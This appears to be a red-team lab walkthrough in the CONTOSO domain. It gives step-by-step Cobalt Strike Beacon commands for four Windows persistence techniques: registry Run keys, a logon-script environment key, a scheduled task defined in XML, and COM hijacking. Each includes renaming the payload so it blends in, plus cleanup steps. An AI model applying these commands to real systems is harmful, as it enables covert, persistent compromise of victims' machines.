# Kill Chain 1

## Registry Run Keys <a href="#registry-run-keys" id="registry-run-keys"></a>

1. Change Beacon's current working directory.
   1. cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
2. Upload an HTTP Beacon payload.
   1. upload C:\Payloads\http\_x64.exe
3. Rename the payload to something that will help it blend in.
   1. mv http\_x64.exe updater.exe
4.  Add the autorun registry key.

    ```beacon-nocolor
    beaconTypeCopyreg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
    ```
5. Verify the registy key has been added.
   1. Launch a PowerShell window.
   2. `Get-Item -Path 'HKCU:Software\Microsoft\Windows\CurrentVersion\Run'`
6. Remove the persistence by deleting the registry key.
   1. `reg_delete HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater`



## Logon Script <a href="#logon-script" id="logon-script"></a>

1.  Assuming the previous payload in _%USERPROFILE%\AppData\Local\Microsoft\WindowsApps_ still exists, create a new **UserInitMprLogonScript** registry key.

    ```beacon-nocolor
    beaconTypeCopyreg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe
    ```
2. Verify the registy key has been added.
   1. Launch a PowerShell window.
   2. Get-Item -Path 'HKCU:Environment'
3. Sign back in to trigger the logon script.
4. Remove the persistence by deleting the registry key
   1. `reg_delete HKCU Environment UserInitMprLogonScript`



## Scheduled Task <a href="#scheduled-task" id="scheduled-task"></a>

1.  Assuming the previous payload is still saved in the WindowsApps directory, save the following XML to your Attacker Desktop (e.g. C:\Payloads\task.xml)

    ```xml
    <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <Triggers>
        <LogonTrigger>
          <Enabled>true</Enabled>
          <UserId>CONTOSO\pchilds</UserId>
        </LogonTrigger>
      </Triggers>
      <Principals>
        <Principal>
          <UserId>CONTOSO\pchilds</UserId>
        </Principal>
      </Principals>
      <Settings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
      </Settings>
      <Actions>
        <Exec>
          <Command>%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe</Command>
        </Exec>
      </Actions>
    </Task>
    ```
2.  In Beacon, create the scheduled task.

    1. schtaskscreate \Beacon XML CREATE

    > Cobalt Strike will launch a file dialogue window for you to select the XML file.
3.  Verify the task was created.

    1. Open a PowerShell window.

    ```powershell
    powershellTypeCopy$task = Get-ScheduledTask -TaskName 'Beacon'
    $task.Actions
    ```
4. Sign back in to trigger the task.



## COM Hijacking <a href="#com-hijacking" id="com-hijacking"></a>

1. Upload a Beacon DLL payload.
   1. `cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps`
   2. `upload C:\Payloads\http_x64.dll`
   3. `mv http_x64.dll WindowsStore.dll`
2.  Create the required registry keys to hijack the **{A6FF50C0-56C0-71CA-5732-BED303A59628}** COM object. This is loaded by svchost, dllhost, explorer, and a few other processes.

    ```beacon-nocolor
    beaconTypeCopyreg_set HKCU "Software\Classes\CLSID\{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\WindowsApps\WindowsStore.dll"
    reg_set HKCU "Software\Classes\CLSID\{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32" "ThreadingModel" REG_SZ "Both"
    ```
3.  Verify the registy values have been added.

    1. Launch a PowerShell window.
    2. `Get-Item -Path 'HKCU:Software\Classes\CLSID\{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32'`

    It's usually pretty hard to know or predict when a process will attempt to load a COM object. You can wait for it to happen or try to force it.
4. Sign back in to (hopefully) trigger the COM object to be loaded.
5. Come back to [Attacker Desktop](https://labclient.labondemand.com/Instructions/6cfc2f11-8f92-4b23-94a9-d691ae514711) and a new Beacon (or many new Beacons) should appear.
6.  Delete the persistence by removing the registry keys:

    ```beacon-nocolor
    beaconTypeCopyreg_delete HKCU "Software\Classes\CLSID\{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32"
    reg_delete HKCU "Software\Classes\CLSID\{A6FF50C0-56C0-71CA-5732-BED303A59628}"
    ```
